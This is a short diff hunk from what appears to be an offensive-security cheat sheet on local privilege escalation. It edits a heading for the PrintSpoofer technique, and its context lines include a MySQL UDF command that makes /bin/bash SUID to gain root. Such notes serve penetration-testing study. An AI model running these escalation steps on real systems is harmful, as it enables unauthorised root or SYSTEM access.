@@ -11367,7 +11367,7 @@ mysql -u root
 > select do_system('chmod +s /bin/bash');
 ```
 
-#### PrintSpoofer LPE
+#### PrintSpoofer LPE SeImpersonatePrivilege 
 
 > https://github.com/itm4n/PrintSpoofer
 
